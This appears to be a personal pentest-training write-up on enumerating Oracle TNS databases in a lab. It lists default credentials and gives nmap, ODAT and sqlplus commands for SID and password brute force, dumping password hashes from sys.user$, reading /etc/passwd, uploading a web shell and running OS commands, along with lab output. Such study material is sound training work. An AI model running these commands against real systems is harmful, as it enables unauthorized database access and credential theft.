# Oracle TNS — Footprinting
**Port(s):** 1521 TCP (additional instances: 1522–1529)
**Protocol:** TCP
**CPTS Module:** Footprinting | **Date:** March 2026

## What Oracle TNS Is and Why Pentesters Care

Oracle TNS (Transparent Network Substrate) is the communication protocol Oracle Database uses to handle client-server connections. It is significantly more complex to enumerate than MySQL or MSSQL because it requires a two-phase attack — first discover the SID (System Identifier), then brute force credentials against that SID. Without a valid SID no connection attempt works at all.

What makes Oracle particularly valuable during a pentest is the combination of legacy default credentials (`scott/tiger` has shipped as a demo account for 30+ years) and the `sysdba` role which is Oracle's equivalent of root — granting full database admin access. Finding `scott/tiger` on a production system is an automatic critical finding, and trying `as sysdba` with every credential found is always worth attempting.

Two main tools cover Oracle enumeration: ODAT for SID discovery and credential brute force, and sqlplus for interactive SQL queries once access is obtained.

## Two-Phase Oracle Attack Flow

```
Phase 1: Discover valid SID  →  Phase 2: Brute force credentials against that SID
```

## Key Oracle Concepts

| Feature | Detail |
|---|---|
| Default Port | 1521 TCP |
| SID | System Identifier — unique name for each database instance, required to connect |
| Default credentials | `scott/tiger` — demo account, still found in production |
| `sysdba` role | Full database admin access — Oracle's equivalent of root |
| Password hash table | `sys.user$` — stores all user password hashes |

## Default Credentials To Always Try

| Username | Password | Account Type |
|---|---|---|
| `scott` | `tiger` | Classic demo account |
| `sys` | `change_on_install` | System admin |
| `system` | `manager` | System admin |
| `dbsnmp` | `dbsnmp` | SNMP monitoring agent |
| `hr` | `hr` | Human Resources demo |

## Enumeration — Step by Step

### Step 1 — Nmap Initial Scan
```bash
sudo nmap -p1521 -sV --script oracle-sid-brute 10.129.14.128
```
Nmap has a built-in `oracle-sid-brute` script but ODAT is far more comprehensive. Use Nmap for initial discovery, ODAT for full enumeration.

### Step 2 — ODAT Full Enumeration
```bash
cd odat/
python3 odat.py all -s 10.129.14.128
```

**What ODAT does automatically in sequence:**
1. Tests if port 1521 is reachable and configured correctly
2. Brute forces valid SIDs from a built-in wordlist
3. Once SID found, brute forces username:password combinations
4. Tests post-auth capabilities (file read, OS commands, etc.)

**Interactive prompts during brute force:**

When ODAT asks what to do with already-tested credentials:
- Type `c` — continue without asking (let the full brute force run uninterrupted)
- Type `s` — stop (use this once you already have valid credentials and ODAT starts on a second service name)

### Step 3 — Connect With sqlplus as sysdba
```bash
sqlplus scott/tiger@10.129.14.128/XE as sysdba
```

**Command breakdown:**
- `scott/tiger` — credentials in `user/password` format
- `@10.129.14.128/XE` — connection string in `@server/SID` format
- `as sysdba` — escalate to full database admin role

`as sysdba` is Oracle's equivalent of `sudo su`. Not every account can use it — `scott` can here because it was granted SYSDBA privilege, which is a critical misconfiguration.

### Step 4 — SQL Enumeration Inside sqlplus
```sql
-- Oracle version
SELECT * FROM v$version;

-- Current user
SELECT user FROM dual;

-- All database users
SELECT username FROM dba_users;

-- All password hashes (requires sysdba)
SELECT name, password FROM sys.user$;

-- Specific user hash
SELECT name, password FROM sys.user$ WHERE name = 'DBSNMP';

-- Current user privileges
SELECT * FROM session_privs;

-- Privileges of a specific user
SELECT * FROM dba_sys_privs WHERE grantee = 'SCOTT';

-- All accessible tables
SELECT table_name FROM all_tables;
```

### Step 5 — ODAT Post-Auth Exploitation
```bash
# Read a file from server (requires FILE privilege)
python3 odat.py utlfile -s 10.129.14.128 -d XE -U scott -P tiger --getFile /etc/passwd /tmp/passwd

# Upload a file to server
python3 odat.py utlfile -s 10.129.14.128 -d XE -U scott -P tiger --putFile /tmp webshell.php webshell.php

# Execute OS commands
python3 odat.py externaltable -s 10.129.14.128 -d XE -U scott -P tiger --exec /bin/bash whoami

# Credential brute force only against known SID
python3 odat.py passwordguesser -s 10.129.14.128 -d XE
```

## Common Misconfigurations

| Misconfiguration | Why It Is Dangerous | Attack Path |
|---|---|---|
| `scott/tiger` default credentials active | Immediate database access | Connect directly with demo account |
| `sysdba` granted to non-admin accounts | Full admin access via regular account | `sqlplus user/pass@IP/SID as sysdba` |
| `sys.user$` readable | All password hashes exposed | Dump hashes for offline cracking |
| Oracle 11g unpatched | Multiple known CVEs | Version fingerprint → CVE research |
| FILE privilege granted | Read and write OS files | `SELECT LOAD_FILE` or ODAT utlfile module |
| Default SID `XE` unchanged | SID discovery trivial | First guess in manual enumeration |

## Real Lab Output
```
Hackerpatel007_1@htb[/htb]$ python3 odat.py all -s 10.129.14.128

[2] (10.129.14.128:1521): Searching valid SIDs
[+] 'XE' is a valid SID. Continue...

[+] Valid credentials found: scott/tiger. Continue...

[+] Accounts found on 10.129.14.128:1521/sid:XE:
scott/tiger

Hackerpatel007_1@htb[/htb]$ sqlplus scott/tiger@10.129.14.128/XE as sysdba

SQL*Plus: Release 19.0.0.0.0 - Production on Wed Mar 29 19:06:12 2023
Connected to:
Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production

SQL> SELECT name, password FROM sys.user$ WHERE name = 'DBSNMP';

NAME                           PASSWORD
------------------------------ ------------------------------
DBSNMP                         E066D214D5421CCC
```

## What I Learned / What Surprised Me

The two-phase attack requirement was something I had not encountered with other databases — you cannot even attempt a login without knowing the SID first, which adds a layer that MySQL and MSSQL simply do not have. The `scott/tiger` credential being valid on a lab server drove home how long these defaults persist in real environments — Oracle shipped it as a demo account for decades and administrators routinely forget to disable it. The `as sysdba` escalation was also unexpected in its simplicity — once you have any credential granted SYSDBA privilege, you effectively have root on the entire database with a single keyword appended to the connection string. The `sys.user$` query returning short 16-character DES hashes confirmed how weak Oracle 11g password storage is compared to modern databases.


## Commands Reference

| Command | Purpose |
|---|---|
| `nmap -p1521 -sV --script oracle-sid-brute <IP>` | Initial Oracle scan and SID discovery |
| `python3 odat.py all -s <IP>` | Full enumeration — SID + credentials + post-auth |
| `python3 odat.py sidguesser -s <IP>` | SID brute force only |
| `python3 odat.py passwordguesser -s <IP> -d <SID>` | Credential brute force only |
| `sqlplus <user>/<pass>@<IP>/<SID>` | Connect to Oracle |
| `sqlplus <user>/<pass>@<IP>/<SID> as sysdba` | Connect with full admin role |
| `SELECT name, password FROM sys.user$;` | Dump all password hashes |
